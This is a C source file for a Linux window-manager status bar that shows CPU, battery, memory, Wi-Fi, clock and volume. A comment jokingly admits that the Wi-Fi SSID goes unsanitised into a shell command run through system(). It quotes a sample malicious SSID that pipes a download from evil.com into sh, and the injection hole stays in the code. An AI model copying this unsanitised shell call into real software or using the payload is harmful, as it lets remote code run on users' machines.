#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sys/select.h>

#define MAX_LEN 256

#define BLACK        "080808"
#define BLUE         "74b2ff"
#define GREEN        "36c692"
#define GREY         "323437"
#define RED          "ff5189"

#define FG(color)   "^c#" color "^"
#define BG(color)   "^b#" color "^"

static char battery_str[MAX_LEN] = BG(BLACK) FG(GREEN) " 󰁹 --%";
static char cpu_str[MAX_LEN] = BG(GREEN) FG(BLACK) "  󰻠   " BG(GREY) FG(GREEN) "  ---%  " BG(BLACK);
static char mem_str[MAX_LEN] = BG(GREY) FG(RED) "  󰘚  " BG(BLACK) FG(RED) "  --- ";
static char wlan_str[MAX_LEN] = BG(BLUE) FG(BLACK) "  󰤯  " BG(BLACK) FG(BLUE) "  Disconnected ";
static char clock_str[MAX_LEN] = BG(BLUE) FG(BLACK) "  󰃭  ---  " BG(BLACK) " ";

static pthread_mutex_t cpu_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t battery_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t wlan_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t clock_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t mem_mutex = PTHREAD_MUTEX_INITIALIZER;

static volatile sig_atomic_t running = 1;

void sig_handler(int signum) {
    if (signum == SIGINT || signum == SIGTERM) {
        running = 0;
    }
}

void* cpu_thread(void* arg) {
    FILE *fp;
    char line[256];
    float cpu_usage;

    while (running) {
        fp = popen("top -bn2 -d1 | grep 'Cpu(s)' | tail -n1 | awk '{print $2}' | cut -d'%' -f1", "r");

        if (fp) {
            if (fgets(line, sizeof(line), fp)) {
                cpu_usage = atof(line);

                pthread_mutex_lock(&cpu_mutex);
                snprintf(cpu_str, MAX_LEN, BG(GREEN) FG(BLACK) "  󰻠  " BG(GREY) FG(GREEN) "  %.1f%%  " BG(BLACK), cpu_usage);
                pthread_mutex_unlock(&cpu_mutex);
            }

            pclose(fp);
        }

        sleep(1);
    }

    return NULL;
}

void* battery_thread(void* arg) {
    FILE *fp;
    int capacity;

    while (running) {
        fp = fopen("/sys/class/power_supply/BAT0/capacity", "r");

        if (fp) {
            if (fscanf(fp, "%d", &capacity) == 1) {
                pthread_mutex_lock(&battery_mutex);
                snprintf(battery_str, MAX_LEN, BG(BLACK) FG(GREEN) " 󰁹 %d%%", capacity);
                pthread_mutex_unlock(&battery_mutex);
            }

            fclose(fp);
        }

        sleep(30);
    }

    return NULL;
}

// NOTE: we do not sanitize the wlan ssid name, technically there is a command injection vulnerability if you connect to a network with a specially crafted ssid name.
// FIX: just dont connect to networks with the name '; curl evil.com/payload | sh; ' and youre good :)
void* wlan_thread(void* arg) {
    FILE *fp;
    char ssid[128] = "";
    char state[32];

    while (running) {
        fp = popen("iwgetid -r", "r");

        if (fp) {
            if (fgets(ssid, sizeof(ssid), fp)) {
                ssid[strcspn(ssid, "\n")] = 0;
            } else {
                ssid[0] = 0;
            }

            pclose(fp);
        }

        fp = popen("cat /sys/class/net/wl*/operstate 2>/dev/null", "r");

        if (fp && fgets(state, sizeof(state), fp)) {
            state[strcspn(state, "\n")] = 0;
            pthread_mutex_lock(&wlan_mutex);

            if (strcmp(state, "up") == 0 && ssid[0] != 0) {
                snprintf(wlan_str, MAX_LEN, BG(BLUE) FG(BLACK) "  󰤨  " BG(BLACK) FG(BLUE) "  %s ", ssid);
            } else {
                snprintf(wlan_str, MAX_LEN, BG(BLUE) FG(BLACK) "  󰤯  " BG(BLACK) FG(BLUE) "  Disconnected ");
            }

            pthread_mutex_unlock(&wlan_mutex);

            if (fp) pclose(fp);
        }

        sleep(5);
    }

    return NULL;
}

void* clock_thread(void* arg) {
    time_t now;
    struct tm *tm_info;
    char buffer[32];

    while (running) {
        time(&now);
        tm_info = localtime(&now);
        strftime(buffer, sizeof(buffer), "%H:%M", tm_info);

        pthread_mutex_lock(&clock_mutex);
        snprintf(clock_str, MAX_LEN, BG(BLUE) FG(BLACK) "  󰃭  %s  " BG(BLACK) " ", buffer);
        pthread_mutex_unlock(&clock_mutex);

        sleep(10);
    }

    return NULL;
}

void* mem_thread(void* arg) {
    FILE *fp;
    char line[256];
    char mem[32];

    while (running) {
        fp = popen("free -h | awk '/^Mem/ { print $3 }' | sed s/i//g", "r");

        if (fp) {
            if (fgets(line, sizeof(line), fp)) {
                line[strcspn(line, "\n")] = 0;
                strncpy(mem, line, sizeof(mem) - 1);
                mem[sizeof(mem) - 1] = 0;

                pthread_mutex_lock(&mem_mutex);
                snprintf(mem_str, MAX_LEN, BG(GREY) FG(RED) "  󰘚  " BG(BLACK) FG(RED) "  %s ", mem);
                pthread_mutex_unlock(&mem_mutex);
            }

            pclose(fp);
        }

        sleep(1);
    }

    return NULL;
}

void get_volume(char *vol_str, size_t len) {
    FILE *fp;
    int volume;
    char muted[8];

    fp = popen("pamixer --get-volume", "r");

    if (fp && fscanf(fp, "%d", &volume) == 1) {
        pclose(fp);
    } else {
        if (fp) pclose(fp);

        volume = 0;
    }

    fp = popen("pamixer --get-mute", "r");

    if (fp && fgets(muted, sizeof(muted), fp)) {
        muted[strcspn(muted, "\n")] = 0;
        pclose(fp);

        if (strcmp(muted, "true") == 0) {
            snprintf(vol_str, len, "\x01" FG(RED) " 󰖁 MUTED\x01");
        } else {
            snprintf(vol_str, len, "\x01" FG(BLUE) " 󰕾 %d%%\x01", volume);
        }
    } else {
        if (fp) pclose(fp);

        snprintf(vol_str, len, "\x01" FG(BLUE) " 󰕾 %d%%\x01", volume);
    }
}

void update_status() {
    char status[2048];
    char vol_str[128];
    char cmd[2048];

    get_volume(vol_str, sizeof(vol_str));

    pthread_mutex_lock(&battery_mutex);
    pthread_mutex_lock(&cpu_mutex);
    pthread_mutex_lock(&mem_mutex);
    pthread_mutex_lock(&wlan_mutex);
    pthread_mutex_lock(&clock_mutex);

    snprintf(status, sizeof(status), "%s  %s  %s  %s  %s  %s", vol_str, battery_str, cpu_str, mem_str, wlan_str, clock_str);

    pthread_mutex_unlock(&clock_mutex);
    pthread_mutex_unlock(&wlan_mutex);
    pthread_mutex_unlock(&mem_mutex);
    pthread_mutex_unlock(&cpu_mutex);
    pthread_mutex_unlock(&battery_mutex);

    snprintf(cmd, sizeof(cmd), "xsetroot -name '%s'", status);

    system(cmd);
}

int main() {
    pthread_t cpu_t, battery_t, wlan_t, clock_t, mem_t;
    sigset_t sigmask, empty_mask;
    struct timespec timeout;

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    signal(SIGUSR1, sig_handler);
    signal(SIGCHLD, SIG_IGN);

    sigemptyset(&sigmask);
    sigaddset(&sigmask, SIGUSR1);
    sigprocmask(SIG_BLOCK, &sigmask, NULL);

    sigemptyset(&empty_mask);

    pthread_create(&cpu_t, NULL, cpu_thread, NULL);
    pthread_create(&battery_t, NULL, battery_thread, NULL);
    pthread_create(&wlan_t, NULL, wlan_thread, NULL);
    pthread_create(&clock_t, NULL, clock_thread, NULL);
    pthread_create(&mem_t, NULL, mem_thread, NULL);

    while (running) {
        update_status();

        timeout.tv_sec = 0;
        timeout.tv_nsec = 500000000; // 0.5 seconds

        pselect(0, NULL, NULL, NULL, &timeout, &empty_mask);
    }

    pthread_join(cpu_t, NULL);
    pthread_join(battery_t, NULL);
    pthread_join(wlan_t, NULL);
    pthread_join(clock_t, NULL);
    pthread_join(mem_t, NULL);

    return 0;
}


